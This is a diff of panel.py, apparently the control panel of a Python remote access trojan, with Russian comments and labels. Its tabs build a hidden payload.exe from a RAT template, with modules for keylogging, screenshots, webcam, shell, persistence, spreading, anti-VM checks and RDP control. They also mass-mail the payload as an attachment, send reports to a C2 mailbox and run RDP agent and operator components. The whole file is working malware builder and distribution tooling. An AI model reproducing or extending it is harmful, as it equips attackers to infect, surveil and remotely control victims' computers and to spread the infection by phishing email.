@@ -1,20 +1,15 @@
 # language: Python, file: panel.py
-# *единая панель: вкладки Builder / Operator / Mass Mail / Agent / Log; горячие клавиши*
-import os, sys, json, time, socket, struct, base64, subprocess, tempfile, pathlib
-import threading, queue
+# *панель: Builder (с RDP-полями) / Рассылка / Agent / Operator; payload умеет RDP*
+import os, sys, json, time, socket, struct, base64, subprocess, tempfile, pathlib, shutil
+import threading, importlib.util
 import tkinter as tk
 from tkinter import ttk, filedialog, messagebox, scrolledtext
 
-# локальные модули
-import importlib.util
-
-BASE = pathlib.Path(__file__).parent
-
-def _load(name):
-    spec = importlib.util.spec_from_file_location(name, BASE / f"{name}.py")
-    mod = importlib.util.module_from_spec(spec)
-    spec.loader.exec_module(mod)
-    return mod
+if getattr(sys, "frozen", False):
+    RES = pathlib.Path(sys._MEIPASS)
+    BASE = pathlib.Path(sys.executable).parent
+else:
+    RES = BASE = pathlib.Path(__file__).parent
 
 try:
     import keyboard
@@ -23,7 +18,7 @@ except ImportError:
     HAS_KEYBOARD = False
 
 try:
-    from PyQt5 import QtWidgets, QtCore
+    from PyQt5 import QtWidgets
     HAS_QT = True
 except ImportError:
     HAS_QT = False
@@ -51,13 +46,21 @@ def _save_cfg(cfg):
     CFG_PATH.write_text(json.dumps(cfg, ensure_ascii=False, indent=2),
                         encoding="utf-8")
 
+def _python_exe():
+    if getattr(sys, "frozen", False):
+        for c in ("python", "python3", "py"):
+            p = shutil.which(c)
+            if p:
+                return p
+        return None
+    return sys.executable
 
-# ====================== Builder tab ======================
 
 class BuilderTab(ttk.Frame):
-    def __init__(self, master, log_fn):
+    def __init__(self, master, log_fn, on_cfg_saved):
         super().__init__(master, padding=10)
         self.log = log_fn
+        self.on_cfg_saved = on_cfg_saved
         self.cfg = _load_cfg()
         self.vars = {}
         self.mods = {}
@@ -68,9 +71,11 @@ class BuilderTab(ttk.Frame):
         fields = [
             ("smtp_host", "SMTP host", self.cfg["smtp_host"]),
             ("smtp_port", "SMTP port", str(self.cfg["smtp_port"])),
-            ("smtp_user", "Email (from)", self.cfg["smtp_user"]),
+            ("smtp_user", "Email (от кого)", self.cfg["smtp_user"]),
             ("smtp_pass", "App password", self.cfg["smtp_pass"]),
-            ("mail_to",  "Recipient (C2)", self.cfg["smtp_user"]),
+            ("mail_to",   "C2 mail (куда отчёты)", self.cfg.get("mail_to", "")),
+            ("c2_host",   "C2 host (IP оператора для RDP)", "127.0.0.1"),
+            ("c2_port",   "C2 port (RDP)", "5555"),
         ]
         r = 0
         for k, label, default in fields:
@@ -80,6 +85,11 @@ class BuilderTab(ttk.Frame):
                       ).grid(row=r, column=1, sticky="ew", pady=3)
             self.vars[k] = v
             r += 1
+
+        ttk.Button(self, text="Сохранить SMTP в mail_config.json",
+                   command=self.save_cfg
+                   ).grid(row=r, column=0, columnspan=2, sticky="ew", pady=(4, 8))
+        r += 1
 
         ttk.Label(self, text="Формат").grid(row=r, column=0, sticky="w")
         self.fmt = tk.StringVar(value="exe")
@@ -103,9 +113,10 @@ class BuilderTab(ttk.Frame):
 
         mods = ttk.LabelFrame(self, text="Модули", padding=6)
         mods.grid(row=r, column=0, columnspan=2, sticky="ew", pady=6)
-        for i, m in enumerate(["persistence", "keylogger", "screenshot", "shell",
-                               "download", "upload", "clipboard", "processes",
-                               "webcam", "spread", "antivm", "selfdelete"]):
+        all_mods = ["persistence", "keylogger", "screenshot", "shell",
+                    "download", "upload", "clipboard", "processes",
+                    "webcam", "spread", "antivm", "selfdelete", "rdp"]
+        for i, m in enumerate(all_mods):
             v = tk.BooleanVar(value=(m not in ("spread", "selfdelete")))
             ttk.Checkbutton(mods, text=m, variable=v
                             ).grid(row=i // 3, column=i % 3, sticky="w")
@@ -115,49 +126,83 @@ class BuilderTab(ttk.Frame):
         ttk.Button(self, text="Собрать payload", command=self.build
                    ).grid(row=r, column=0, columnspan=2, pady=10, sticky="ew")
 
+    def save_cfg(self):
+        cfg = _load_cfg()
+        for k in ("smtp_host", "smtp_port", "smtp_user", "smtp_pass"):
+            cfg[k] = self.vars[k].get()
+        try:
+            cfg["smtp_port"] = int(cfg["smtp_port"])
+        except ValueError:
+            cfg["smtp_port"] = 587
+        _save_cfg(cfg)
+        self.on_cfg_saved(cfg)
+        self.log("[cfg] SMTP сохранён в mail_config.json")
+
     def build(self):
         cfg = {k: v.get() for k, v in self.vars.items()}
         cfg["safe_mode"] = self.var_safe.get()
         cfg["modules"] = [k for k, v in self.mods.items() if v.get()]
+        try:
+            cfg["smtp_port"] = int(cfg["smtp_port"])
+            cfg["c2_port"] = int(cfg["c2_port"])
+        except ValueError:
+            messagebox.showerror("Ошибка", "Порты должны быть числами.")
+            return
         if not cfg["smtp_user"] or not cfg["smtp_pass"] or not cfg["mail_to"]:
-            messagebox.showerror("Ошибка", "Заполните SMTP и получателя.")
+            messagebox.showerror("Ошибка",
+                                 "Заполни Email, App password и C2 mail.")
             return
-        template = BASE / "rat_template.py"
+        template = RES / "rat_template.py"
         if not template.exists():
-            messagebox.showerror("Ошибка", "rat_template.py не найден рядом с panel.py")
+            messagebox.showerror("Ошибка",
+                                 f"rat_template.py не найден рядом с panel.\n{RES}")
             return
+        py = _python_exe()
+        if not py:
+            messagebox.showerror("Ошибка",
+                                 "Python не найден в системе. Установи Python 3.11.")
+            return
+
         work = pathlib.Path(tempfile.mkdtemp(prefix="ratbuild_"))
-        src = work / "rat.py"
-        text = template.read_text(encoding="utf-8").replace(
-            "__CFG__", json.dumps(cfg, ensure_ascii=False))
-        src.write_text(text, encoding="utf-8")
+        # копируем шаблон и rdp_agent_lib в work, чтобы pyinstaller подхватил импорт
+        src = work / "rat_build.py"
+        src.write_text(template.read_text(encoding="utf-8").replace(
+            "__CFG__", json.dumps(cfg, ensure_ascii=False)), encoding="utf-8")
+        lib = RES / "rdp_agent_lib.py"
+        if lib.exists():
+            shutil.copy(lib, work / "rdp_agent_lib.py")
+
         out_dir = pathlib.Path(filedialog.askdirectory(title="Куда сохранить"))
         if not out_dir:
             return
-        self.log(f"[build] формат={self.fmt.get()} compiler={self.comp.get()} safe={cfg['safe_mode']}")
+        self.log(f"[build] fmt={self.fmt.get()} comp={self.comp.get()} safe={cfg['safe_mode']} rdp={('rdp' in cfg['modules'])}")
         threading.Thread(target=self._compile,
-                         args=(src, self.fmt.get(), self.comp.get(), out_dir),
-                         daemon=True).start()
+                         args=(src, work, self.fmt.get(), self.comp.get(),
+                               out_dir, py), daemon=True).start()
 
-    def _compile(self, src, fmt, comp, out_dir):
+    def _compile(self, src, work, fmt, comp, out_dir, py):
         try:
             if fmt == "bat":
                 out = out_dir / "payload.bat"
-                out.write_text(f'@echo off\r\nstart "" /b "{sys.executable}" "{src}"\r\n',
+                out.write_text(f'@echo off\r\nstart "" /b "{py}" "{src}"\r\n',
                                encoding="utf-8")
             elif comp == "nuitka":
-                args = [sys.executable, "-m", "nuitka", "--onefile",
-                        "--windows-disable-console", "--assume-yes-for-downloads",
-                        f"--output-dir={out_dir}", "--output-filename=payload.exe",
-                        str(src)]
-                subprocess.run(args, check=True, capture_output=True)
+                subprocess.run([py, "-m", "nuitka", "--onefile",
+                                "--windows-disable-console",
+                                "--assume-yes-for-downloads",
+                                f"--output-dir={out_dir}",
+                                "--output-filename=payload.exe",
+                                str(src)], cwd=work, check=True, capture_output=True)
                 out = out_dir / "payload.exe"
             else:
-                args = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole",
-                        "--name", "payload", "--distpath", str(out_dir), str(src)]
-                subprocess.run(args, check=True, capture_output=True)
+                subprocess.run([py, "-m", "PyInstaller", "--onefile", "--noconsole",
+                                "--name", "payload", "--distpath", str(out_dir),
+                                str(src)], cwd=work, check=True, capture_output=True)
                 out = out_dir / "payload.exe"
             self._validate(out, fmt)
+        except subprocess.CalledProcessError as e:
+            err = (e.stderr or b"").decode(errors="ignore")[-500:]
+            self.log(f"[build] FAIL: {err}")
         except Exception as e:
             self.log(f"[build] FAIL: {e}")
 
@@ -171,7 +216,8 @@ class BuilderTab(ttk.Frame):
                 ok = head.startswith(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1")
             elif fmt == "bat":
                 txt = open(path, "r", errors="ignore").read(4096).lower()
-                ok = any(txt.lstrip().startswith(p) for p in ("@echo", "::", "rem ", "echo "))
+                ok = any(txt.lstrip().startswith(p)
+                         for p in ("@echo", "::", "rem ", "echo "))
             else:
                 ok = False
         except Exception:
@@ -187,8 +233,6 @@ class BuilderTab(ttk.Frame):
         self.after(0, messagebox.showinfo, "Готово", f"Файл: {path}")
 
 
-# ====================== Mass mail tab ======================
-
 class MassMailTab(ttk.Frame):
     def __init__(self, master, log_fn):
         super().__init__(master, padding=10)
@@ -196,36 +240,37 @@ class MassMailTab(ttk.Frame):
         self.cfg = _load_cfg()
         self._stop = threading.Event()
         self._ui()
+        self.refresh_cfg()
 
     def _ui(self):
         self.columnconfigure(1, weight=1)
-        ttk.Label(self, text="SMTP").grid(row=0, column=0, sticky="w")
+        ttk.Label(self, text="От кого (SMTP)").grid(row=0, column=0, sticky="w")
         self.smtp_label = ttk.Label(self, text="")
         self.smtp_label.grid(row=0, column=1, columnspan=2, sticky="w")
-        self._refresh_smtp_label()
 
-        ttk.Label(self, text="Получатели (по одному на строку)"
-                  ).grid(row=1, column=0, columnspan=3, sticky="w", pady=(8, 2))
+        ttk.Label(self, text="КУДА слать — получатели (по одному на строку)",
+                  font=("", 10, "bold")
+                  ).grid(row=1, column=0, columnspan=3, sticky="w", pady=(10, 2))
         self.txt_to = tk.Text(self, height=7)
         self.txt_to.grid(row=2, column=0, columnspan=3, sticky="ew")
 
         ttk.Label(self, text="Тема").grid(row=3, column=0, sticky="w", pady=3)
-        self.var_subj = tk.StringVar(value=self.cfg["subject"])
+        self.var_subj = tk.StringVar(value=self.cfg.get("subject", ""))
         ttk.Entry(self, textvariable=self.var_subj).grid(
             row=3, column=1, columnspan=2, sticky="ew")
 
         ttk.Label(self, text="Текст").grid(row=4, column=0, sticky="nw")
         self.txt_body = tk.Text(self, height=4)
-        self.txt_body.insert("1.0", self.cfg["body"])
+        self.txt_body.insert("1.0", self.cfg.get("body", ""))
         self.txt_body.grid(row=4, column=0, columnspan=3, sticky="ew")
 
         ttk.Label(self, text="Вложение").grid(row=5, column=0, sticky="w", pady=3)
-        self.var_att = tk.StringVar(value=self.cfg["attach_file"])
+        self.var_att = tk.StringVar(value=self.cfg.get("attach_file", ""))
         ttk.Entry(self, textvariable=self.var_att).grid(row=5, column=1, sticky="ew")
         ttk.Button(self, text="...", width=3, command=self._pick).grid(row=5, column=2)
 
         ttk.Label(self, text="Задержка, сек").grid(row=6, column=0, sticky="w")
-        self.var_delay = tk.DoubleVar(value=self.cfg["delay_sec"])
+        self.var_delay = tk.DoubleVar(value=self.cfg.get("delay_sec", 3))
         ttk.Spinbox(self, from_=1, to=60, textvariable=self.var_delay, width=6
                     ).grid(row=6, column=1, sticky="w")
 
@@ -246,10 +291,15 @@ class MassMailTab(ttk.Frame):
         self.txt_log.grid(row=10, column=0, columnspan=3, sticky="nsew")
         self.rowconfigure(10, weight=1)
 
-    def _refresh_smtp_label(self):
+    def refresh_cfg(self):
+        self.cfg = _load_cfg()
         self.smtp_label.configure(
             text=f"{self.cfg['smtp_host']}:{self.cfg['smtp_port']}  "
-                 f"({self.cfg['smtp_user'] or 'не настроено'})")
+                 f"({self.cfg['smtp_user'] or 'не настроено — заполни Builder'})")
+        if not self.var_subj.get():
+            self.var_subj.set(self.cfg.get("subject", ""))
+        if not self.var_att.get():
+            self.var_att.set(self.cfg.get("attach_file", ""))
 
     def _log(self, line):
         self.txt_log.configure(state="normal")
@@ -276,20 +326,25 @@ class MassMailTab(ttk.Frame):
         return out
 
     def start(self):
+        self.refresh_cfg()
         if not self.cfg["smtp_user"] or not self.cfg["smtp_pass"]:
             messagebox.showerror("Ошибка",
-                                 "SMTP не настроен. Заполни mail_config.json или вкладку Builder.")
+                                 "SMTP не настроен. Вкладка Builder → заполни и сохрани.")
             return
         rcpts = self._parse(self.txt_to.get("1.0", "end"))
         if not rcpts:
-            messagebox.showerror("Ошибка", "Нет валидных адресов.")
+            messagebox.showerror("Ошибка",
+                                 "Поле «Получатели» пустое или нет валидных адресов.")
             return
         att = self.var_att.get().strip()
         if att and not os.path.isfile(att):
             messagebox.showerror("Ошибка", "Файл вложения не найден.")
             return
-        if not messagebox.askyesno("Подтверждение",
-                                   f"Отправить на {len(rcpts)} адрес(ов)?"):
+        if not messagebox.askyesno(
+                "Подтверждение",
+                f"От: {self.cfg['smtp_user']}\n"
+                f"Куда ({len(rcpts)}):\n" + "\n".join(rcpts[:10]) +
+                ("\n..." if len(rcpts) > 10 else "") + "\n\nОтправить?"):
             return
         self._stop.clear()
         self.btn_send.configure(state="disabled")
@@ -317,11 +372,12 @@ class MassMailTab(ttk.Frame):
             with open(att, "rb") as f:
                 att_data = f.read()
         try:
-            s = smtplib.SMTP(self.cfg["smtp_host"], int(self.cfg["smtp_port"]), timeout=30)
+            s = smtplib.SMTP(self.cfg["smtp_host"], int(self.cfg["smtp_port"]),
+                             timeout=30)
             s.ehlo(); s.starttls(); s.ehlo()
             s.login(self.cfg["smtp_user"], self.cfg["smtp_pass"])
         except smtplib.SMTPAuthenticationError:
-            self._log("[!] auth error: app password?")
+            self._log("[!] auth error: app password? 2FA включена?")
             self.after(0, self._done); return
         except Exception as e:
             self._log(f"[!] smtp: {e}")
@@ -331,7 +387,7 @@ class MassMailTab(ttk.Frame):
                 if self._stop.is_set():
                     break
                 m = MIMEMultipart()
-                m["From"] = f"{self.cfg['from_name']} <{self.cfg['smtp_user']}>"
+                m["From"] = f"{self.cfg.get('from_name','Updater')} <{self.cfg['smtp_user']}>"
                 m["To"] = r
                 m["Subject"] = subject
                 m.attach(MIMEText(body, "plain", "utf-8"))
@@ -341,10 +397,10 @@ class MassMailTab(ttk.Frame):
                     m.attach(p)
                 try:
                     s.send_message(m); ok += 1
-                    self.after(0, self._log, f"[{i}/{len(rcpts)}] {r} ok")
+                    self.after(0, self._log, f"[{i}/{len(rcpts)}] -> {r}  ok")
                 except Exception as e:
                     fail += 1
-                    self.after(0, self._log, f"[{i}/{len(rcpts)}] {r} FAIL: {e}")
+                    self.after(0, self._log, f"[{i}/{len(rcpts)}] -> {r}  FAIL: {e}")
                 self.after(0, self.progress.configure, {"value": i})
                 time.sleep(max(1.0, delay))
         finally:
@@ -358,8 +414,6 @@ class MassMailTab(ttk.Frame):
         self.btn_stop.configure(state="disabled")
 
 
-# ====================== Agent tab ======================
-
 class AgentTab(ttk.Frame):
     def __init__(self, master, log_fn):
         super().__init__(master, padding=10)
@@ -367,7 +421,7 @@ class AgentTab(ttk.Frame):
         self._proc = None
         self.columnconfigure(1, weight=1)
 
-        ttk.Label(self, text="Host (оператор)").grid(row=0, column=0, sticky="w", pady=3)
+        ttk.Label(self, text="Host (IP оператора)").grid(row=0, column=0, sticky="w", pady=3)
         self.var_host = tk.StringVar(value="127.0.0.1")
         ttk.Entry(self, textvariable=self.var_host).grid(row=0, column=1, sticky="ew")
 
@@ -376,7 +430,7 @@ class AgentTab(ttk.Frame):
         ttk.Entry(self, textvariable=self.var_port, width=10).grid(row=1, column=1, sticky="w")
 
         self.var_safe = tk.BooleanVar(value=True)
-        ttk.Checkbutton(self, text="RAT_SAFE (не подключаться, только логи)",
+        ttk.Checkbutton(self, text="RAT_SAFE (не подключаться)",
                         variable=self.var_safe).grid(row=2, column=0, columnspan=2,
                                                      sticky="w", pady=6)
 
@@ -384,8 +438,7 @@ class AgentTab(ttk.Frame):
         btns.grid(row=3, column=0, columnspan=2, sticky="ew")
         self.btn_start = ttk.Button(btns, text="Запустить агент", command=self.start)
         self.btn_start.grid(row=0, column=0, padx=4, sticky="w")
-        self.btn_stop = ttk.Button(btns, text="Стоп", command=self.stop,
-                                   state="disabled")
+        self.btn_stop = ttk.Button(btns, text="Стоп", command=self.stop, state="disabled")
         self.btn_stop.grid(row=0, column=1, padx=4, sticky="w")
 
         self.out = scrolledtext.ScrolledText(self, height=14, state="disabled")
@@ -402,14 +455,19 @@ class AgentTab(ttk.Frame):
     def start(self):
         if self._proc and self._proc.poll() is None:
             return
+        py = _python_exe()
+        agent = RES / "rdp_agent.py"
+        if not py or not agent.exists():
+            self._log("[agent] python или rdp_agent.py не найдены")
+            return
         env = os.environ.copy()
         env["RAT_HOST"] = self.var_host.get()
         env["RAT_PORT"] = self.var_port.get()
         env["RAT_SAFE"] = "1" if self.var_safe.get() else "0"
         try:
             self._proc = subprocess.Popen(
-                [sys.executable, str(BASE / "rdp_agent.py")],
-                env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                [py, str(agent)], env=env,
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                 text=True, bufsize=1,
                 creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0)
         except Exception as e:
@@ -418,7 +476,7 @@ class AgentTab(ttk.Frame):
         self.btn_start.configure(state="disabled")
         self.btn_stop.configure(state="normal")
         threading.Thread(target=self._read, daemon=True).start()
-        self._log(f"[agent] запущен safe={env['RAT_SAFE']} host={env['RAT_HOST']}:{env['RAT_PORT']}")
+        self._log(f"[agent] safe={env['RAT_SAFE']} {env['RAT_HOST']}:{env['RAT_PORT']}")
 
     def _read(self):
         for line in self._proc.stdout:
@@ -436,22 +494,19 @@ class AgentTab(ttk.Frame):
             self._log("[agent] terminated")
 
 
-# ====================== Operator tab ======================
-
 class OperatorTab(ttk.Frame):
     def __init__(self, master, log_fn):
         super().__init__(master, padding=10)
         self.log = log_fn
         self.thread = None
         self.columnconfigure(0, weight=1)
-        self.rowconfigure(2, weight=1)
+        self.rowconfigure(3, weight=1)
 
-        ttk.Label(self, text="RDP-оператор запускается в отдельном окне (PyQt5)."
+        ttk.Label(self, text="RDP-оператор открывается в отдельном окне (PyQt5)."
                   ).grid(row=0, column=0, sticky="w")
-        ttk.Label(self, text="Ctrl+Insert — поднять окно оператора наверх."
+        ttk.Label(self, text="Ctrl+Insert — поднять панель и переключить сюда."
                   ).grid(row=1, column=0, sticky="w", pady=(0, 8))
-        self.btn_run = ttk.Button(self, text="Запустить оператор",
-                                  command=self.launch)
+        self.btn_run = ttk.Button(self, text="Запустить оператор", command=self.launch)
         self.btn_run.grid(row=2, column=0, sticky="nw")
         self.out = scrolledtext.ScrolledText(self, height=10, state="disabled")
         self.out.grid(row=3, column=0, sticky="nsew", pady=(8, 0))
@@ -479,7 +534,7 @@ class OperatorTab(ttk.Frame):
         try:
             app = QtWidgets.QApplication.instance() or QtWidgets.QApplication(sys.argv)
             spec = importlib.util.spec_from_file_location(
-                "rdp_operator", BASE / "rdp_operator.py")
+                "rdp_operator", RES / "rdp_operator.py")
             mod = importlib.util.module_from_spec(spec)
             spec.loader.exec_module(mod)
             w = mod.Operator()
@@ -489,21 +544,20 @@ class OperatorTab(ttk.Frame):
             self._log(f"[operator] fail: {e}")
 
 
-# ====================== Main panel ======================
-
 class Panel(tk.Tk):
     def __init__(self):
         super().__init__()
         self.title("RAT Control Panel")
-        self.geometry("980x680")
+        self.geometry("1000x760")
         self._build()
         self._bind_hotkeys()
 
     def _build(self):
         nb = ttk.Notebook(self)
         nb.pack(fill="both", expand=True, padx=8, pady=8)
+        self.nb = nb
 
-        self.tab_builder = BuilderTab(nb, self.log)
+        self.tab_builder = BuilderTab(nb, self.log, self._on_cfg_saved)
         self.tab_mail = MassMailTab(nb, self.log)
         self.tab_agent = AgentTab(nb, self.log)
         self.tab_op = OperatorTab(nb, self.log)
@@ -512,17 +566,11 @@ class Panel(tk.Tk):
         nb.add(self.tab_mail, text="Рассылка")
         nb.add(self.tab_agent, text="Agent")
         nb.add(self.tab_op, text="Operator")
-        self.nb = nb
 
         log_frame = ttk.LabelFrame(self, text="Общий лог", padding=4)
         log_frame.pack(fill="both", expand=False, padx=8, pady=(0, 8))
-        self.common_log = scrolledtext.ScrolledText(log_frame, height=6,
-                                                    state="disabled")
+        self.common_log = scrolledtext.ScrolledText(log_frame, height=6, state="disabled")
         self.common_log.pack(fill="both", expand=True)
-
-        self.status = tk.StringVar(value="ready")
-        ttk.Label(self, textvariable=self.status, anchor="w"
-                  ).pack(fill="x", padx=8, pady=(0, 6))
 
     def log(self, line):
         self.common_log.configure(state="normal")
@@ -530,9 +578,13 @@ class Panel(tk.Tk):
         self.common_log.see("end")
         self.common_log.configure(state="disabled")
 
+    def _on_cfg_saved(self, cfg):
+        self.tab_mail.refresh_cfg()
+        self.log("[cfg] рассылка обновлена SMTP")
+
     def _bind_hotkeys(self):
         if not HAS_KEYBOARD:
-            self.log("[hotkeys] keyboard не установлен — Alt+Insert/Ctrl+Insert не работают")
+            self.log("[hotkeys] keyboard не установлен")
             return
         try:
             keyboard.add_hotkey("alt+insert", self._focus_mail)
@@ -545,14 +597,14 @@ class Panel(tk.Tk):
         self.after(0, self._do_focus_mail)
 
     def _do_focus_mail(self):
-        self.showNormal(); self.raise_(); self.activateWindow()
+        self.deiconify(); self.showNormal(); self.raise_(); self.activateWindow()
         self.nb.select(self.tab_mail)
 
     def _focus_operator(self):
         self.after(0, self._do_focus_op)
 
     def _do_focus_op(self):
-        self.showNormal(); self.raise_(); self.activateWindow()
+        self.deiconify(); self.showNormal(); self.raise_(); self.activateWindow()
         self.nb.select(self.tab_op)
 
 
